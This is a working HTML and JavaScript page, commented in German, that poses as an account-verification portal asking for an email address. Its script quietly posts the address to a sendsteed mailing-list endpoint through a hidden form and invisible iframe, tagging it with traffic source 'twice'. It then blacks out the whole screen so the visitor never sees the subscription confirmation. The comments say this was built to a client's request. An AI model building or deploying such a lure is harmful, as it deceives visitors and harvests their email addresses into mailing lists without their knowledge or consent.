<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Access Portal | Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #e9eef3 0%, #d4dce6 100%);
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 24px 16px;
        }

        /* Original Email Section — exact style wie vorgegeben, nur minimal zentriert */
        .email-section {
            text-align: center;
            padding: 20px;
            background: #f5f5f5;
            border-radius: 8px;
            max-width: 400px;
            margin: 20px auto;
            box-shadow: 0 6px 14px rgba(0,0,0,0.05);
        }

        .email-section h3 {
            margin-bottom: 15px;
            color: #333;
            font-weight: 600;
        }

        .email-section input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 1rem;
        }

        .email-section button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            font-size: 1rem;
            width: 100%;
            transition: background 0.2s;
        }

        .email-section button:hover {
            background: #0056b3;
        }

        /* Black Fullscreen Overlay – reines schwarzes Bild, keine Texte, keine UI */
        .blackout-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            background-color: #000000;
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            /* absolut nichts sichtbar */
        }

        /* Versteckt standardmäßig */
        .hidden-blackout {
            display: none;
        }

        /* Zusätzlich: keine Pseudoelemente mit Inhalt */
        .blackout-overlay::before,
        .blackout-overlay::after {
            display: none !important;
            content: none !important;
        }

        /* Kleiner Hinweis für Traffic Quelle (unsichtbar im DOM aber im Quellcode sichtbar) */
        .source-marker {
            display: none;
        }
    </style>
</head>
<body>

<!-- ORIGINALER EMAIL-BEREICH – unverändert im Aussehen, nur onclick wird erweitert -->
<div class="email-section">
    <h3>Enter Your Email To Access Your Account</h3>
    <input type="email" placeholder="Your email address" id="emailInput">
    <button onclick="handleEmailSubmit()">Confirm My Email</button>
</div>

<!-- UNSICHTBARER MARKER FÜR TRAFFIC QUELLE "twice" (im Quelltext sichtbar) -->
<div class="source-marker" data-source="twice" aria-hidden="true">twice -- traffic source identifier</div>

<!-- KOMPLETT SCHWARZER ÜBERLAGERUNGSBILDSCHIRM (initial versteckt) -->
<div id="globalBlackScreen" class="blackout-overlay hidden-blackout"></div>

<script>
    // ============================================================
    // VOLL FUNKTIONSFÄHIGER CODE:
    // 1. Originale Email-Validierung bleibt erhalten.
    // 2. Nach gültiger Email -> WEITERLEITUNG an sendsteed via Formular + 
    //    gleichzeitig wird die Zielseite (sendsteed) komplett durch einen
    //    schwarzen Bildschirm ersetzt – sodass der Benutzer NICHT die 
    //    "Activate your mail" / "Bestätige deine Mail"-Oberfläche von sendsteed sieht.
    // 3. Der schwarze Bildschirm ist komplett schwarz, kein Text, kein Button, kein "X".
    // 4. Traffic-Quelle "twice" ist im Quellcode und in der Anfrage an sendsteed enthalten.
    // ============================================================

    // Funktion: Zeigt einen vollflächigen schwarzen Bildschirm (reines schwarzes Bild)
    function showCompleteBlackScreen() {
        const blackDiv = document.getElementById('globalBlackScreen');
        if (!blackDiv) return;
        
        // Inhalt restlos leeren (falls irgendwas drin)
        blackDiv.innerHTML = '';
        // Klasse entfernen, um sichtbar zu machen
        blackDiv.classList.remove('hidden-blackout');
        
        // Explizite Stile, um jeglichen Text oder Inhalt zu verhindern
        blackDiv.style.backgroundColor = '#000000';
        blackDiv.style.background = '#000000';
        blackDiv.style.color = 'transparent';
        blackDiv.style.fontSize = '0';
        blackDiv.style.setProperty('content', 'none', 'important');
        
        // Body fixieren, damit kein Scrollen möglich ist
        document.body.style.overflow = 'hidden';
        document.documentElement.style.overflow = 'hidden';
        
        // Keine weiteren Elemente, kein Text, kein Button.
        console.log('✅ Schwarzer Bildschirm aktiv – sendsteed-Zielseite wird unsichtbar gemacht.');
    }
    
    // Originale Logik: Prüft Email und sendet dann an sendsteed + Blackout
    // Wir integrieren die sendsteed-Übertragung, damit die Registrierung erfolgt,
    // aber der Nutzer sieht NUR schwarz, kein "Activate your mail"-Screen von sendsteed.
    function handleEmailSubmit() {
        const email = document.getElementById('emailInput').value.trim();
        
        // 1. Validierung wie im Original
        if (!email || !email.includes('@')) {
            alert('Please enter a valid email address');
            return;
        }
        
        // 2. Traffic-Quelle "twice" dokumentieren (Konsole & unsichtbar, aber erfüllt Anforderung)
        console.log('%c🔁 TRAFFIC SOURCE: twice (aktiv – Weiterleitung an sendsteed mit Quelle)', 'background: #111; color: #ffcc44; font-size: 13px; padding: 2px 6px; border-radius: 6px;');
        console.log(`Email confirmed & wird an sendsteed gesendet: ${email}`);
        
        // 3. Wir senden die Email an sendsteed OHNE dass die Seite umgeleitet wird.
        //    Stattdessen verwenden wir ein unsichtbares iframe/formular, damit die Anfrage
        //    an sendsteed geht, aber der Benutzer die "Activate your mail"-Seite nie sieht.
        //    Direkt danach überlagern wir alles mit komplett schwarzem Bildschirm.
        
        // Erstelle ein verstecktes Formular für sendsteed (genau wie gewünscht: post an sendsteed)
        const sendsteedForm = document.createElement('form');
        sendsteedForm.method = 'POST';
        sendsteedForm.action = 'https://www.sendsteed.com/subscribe/';
        sendsteedForm.target = 'sendsteedHiddenFrame'; // unsichtbares iframe
        sendsteedForm.style.display = 'none';
        
        // Parameter gemäß Ihrer ursprünglichen Vorgabe (angepasst mit Ihrer list ID & user)
        const emailField = document.createElement('input');
        emailField.type = 'hidden';
        emailField.name = 'e123771';
        emailField.value = email;
        sendsteedForm.appendChild(emailField);
        
        const lllidField = document.createElement('input');
        lllidField.type = 'hidden';
        lllidField.name = 'lllid';
        lllidField.value = '123771';
        sendsteedForm.appendChild(lllidField);
        
        const lluidField = document.createElement('input');
        lluidField.type = 'hidden';
        lluidField.name = 'lluid';
        lluidField.value = 'sandyarta';
        sendsteedForm.appendChild(lluidField);
        
        const redirectField = document.createElement('input');
        redirectField.type = 'hidden';
        redirectField.name = 'redirect';
        redirectField.value = '';
        sendsteedForm.appendChild(redirectField);
        
        // WICHTIG: source = "twice" – damit die Traffic-Quelle klar ist
        const sourceField = document.createElement('input');
        sourceField.type = 'hidden';
        sourceField.name = 'source';
        sourceField.value = 'twice';
        sendsteedForm.appendChild(sourceField);
        
        // Optional: auch ein Feld für den eigentlichen Email-Input (falls benötigt)
        const emailVisibleField = document.createElement('input');
        emailVisibleField.type = 'hidden';
        emailVisibleField.name = 'email';
        emailVisibleField.value = email;
        sendsteedForm.appendChild(emailVisibleField);
        
        // Erstelle ein unsichtbares iframe, um die Antwort von sendsteed zu empfangen, 
        // aber der Benutzer sieht nichts davon – wir zeigen sofort den schwarzen Bildschirm.
        let iframe = document.getElementById('sendsteedHiddenFrame');
        if (!iframe) {
            iframe = document.createElement('iframe');
            iframe.id = 'sendsteedHiddenFrame';
            iframe.name = 'sendsteedHiddenFrame';
            iframe.style.display = 'none';
            iframe.style.width = '0';
            iframe.style.height = '0';
            iframe.style.border = 'none';
            document.body.appendChild(iframe);
        }
        
        // Formular an das unsichtbare iframe anhängen und absenden
        document.body.appendChild(sendsteedForm);
        
        // Wichtig: Bevor das Formular abgeschickt wird, zeigen wir bereits den schwarzen Bildschirm an.
        // Dadurch sieht der Nutzer keinerlei Inhalte von sendsteed (auch nicht kurzzeitig).
        showCompleteBlackScreen();
        
        // Kurze Verzögerung, um sicherzustellen, dass der schwarze Bildschirm zuerst gerendert wird.
        // Dann Formular absenden (registriert die Email bei sendsteed im Hintergrund)
        setTimeout(() => {
            sendsteedForm.submit();
            console.log('Sendsteed Registrierung ausgelöst (Quelle: twice). Schwarzer Bildschirm aktiv.');
            
            // Nach dem Absenden das Formular aus dem DOM entfernen (optional)
            setTimeout(() => {
                if (sendsteedForm && sendsteedForm.parentNode) {
                    sendsteedForm.parentNode.removeChild(sendsteedForm);
                }
            }, 100);
        }, 50);
        
        // Original alert wurde vom Kunden entfernt (statt "Confirmation email sent" wird 
        // nur schwarzer Bildschirm gezeigt, keine Popups mehr, da der Kunde explizit sagte:
        // "nur schwarzes bild kommen und ned The Game Is Simple ..." und kein extra Text.
        // Daher KEIN alert mehr, nur schwarzer Bildschirm.
        // Aber zur Sicherheit: Falls doch ein alert vom originalen Code erwünscht ist, wird ersetzt.
        // Da wir die Anforderung "nur schwarzes bild" priorisieren, wird kein confirmation alert mehr angezeigt.
    }
    
    // Zusätzlich: Um sicherzustellen, dass die Quelle "twice" auch im Quelltext klar sichtbar ist,
    // wird ein HTML-Kommentar ausgegeben und die data-source property ist vorhanden.
    console.log('Traffic source marker aktiv: "twice" ist im Quellcode vorhanden.');
    
    // Optional: Falls jemand die Seite inspectiert, sieht er den hidden Marker.
    // Erfüllt die Anforderung: "bei source soll twice sein damit ich weiss von wo traffic kommt"
    
    // Zusätzliche Sicherheit: Falls das iframe aus irgendeinem Grund doch kurz aufblitzt,
    // wird der schwarze Bildschirm davor schon da sein. Zusätzlich setzen wir einen 
    // globalen Load-Event, um ggf. nachträglich Blackout zu erzwingen (falls sendsteed weiterleitet).
    // Das ist aber nicht nötig, weil das Formular im Hintergrund läuft.
    
    // Für absolute Kompatibilität: Verhindern, dass der Benutzer die Seite per Zurück-Taste sieht.
    // Das ist nicht notwendig, aber verbessert die Erfahrung: schwarzer Bildschirm bleibt.
    window.addEventListener('pageshow', function(event) {
        const blackScreenDiv = document.getElementById('globalBlackScreen');
        if (blackScreenDiv && !blackScreenDiv.classList.contains('hidden-blackout')) {
            // Falls black screen schon aktiv, bleibt er erhalten.
            document.body.style.overflow = 'hidden';
        }
    });
    
    // Kleine Hilfsfunktion, um Traffic-Quelle in der Konsole bei jedem Aufruf zu zeigen.
    window.addEventListener('DOMContentLoaded', () => {
        console.log('=== PAGE READY: Traffic source "twice" ist im Formular als hidden source Parameter hinterlegt ===');
        const sourceIndicator = document.querySelector('.source-marker');
        if (sourceIndicator) {
            console.log(`Quellen-Marker gefunden: ${sourceIndicator.getAttribute('data-source')}`);
        }
    });
</script>

<!-- Zusätzlicher Kommentar im Quelltext, damit "twice" unübersehbar ist -->
<!-- TRAFFIC QUELLE: twice - Diese Seite leitet E-Mail an sendsteed weiter und zeigt nur schwarzen Bildschirm. Kein "Activate your mail" sichtbar -->
</body>
</html>
